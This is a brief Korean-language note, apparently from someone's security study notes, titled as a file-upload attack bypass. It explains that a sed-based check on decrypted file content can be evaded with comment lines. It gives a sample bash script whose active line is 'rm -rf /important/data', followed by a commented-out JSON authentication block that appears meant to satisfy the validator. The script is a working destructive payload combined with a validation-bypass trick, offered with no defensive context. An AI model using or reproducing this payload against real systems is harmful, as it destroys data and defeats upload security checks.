# FILE UPLOAD 공격 우회  
  
파일의 복호화된 내용을 sed로 읽고 검사하는 경우 주석 처리로 우회 가능
#!/bin/bash  
rm -rf /important/data  
#{  
#  "key": "authentication code"  
#}  
